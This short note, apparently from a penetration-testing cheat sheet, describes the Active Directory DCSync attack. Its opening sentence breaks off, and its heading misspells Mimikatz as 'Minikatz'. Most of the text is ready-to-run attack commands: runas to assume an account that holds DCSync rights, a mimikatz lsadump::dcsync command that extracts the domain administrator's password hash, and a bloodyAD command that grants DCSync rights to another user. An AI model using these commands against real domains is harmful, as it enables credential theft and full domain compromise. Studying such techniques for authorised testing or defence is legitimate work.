In Active Directory, **DCSync** is a technique used by attackers to impersonate a domain controller and request password hashes from other domain controllers using the **DSGetNCChanges** function. It
#### Minikatz

Run as user who has DCSync rights:

```bash
runas /netonly /user:<domain>\<user> powershell
```

Extract Administrators hash:

```bash
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:<domain> /user:<domain>\administrator
```

Add user (Need write DACL over domain admins):

```bash
bloodyAD --host x.x.x.x -u <user> -p 'password' -d 'trilocor.local' add dcsync <user_to_add_dcsync>
```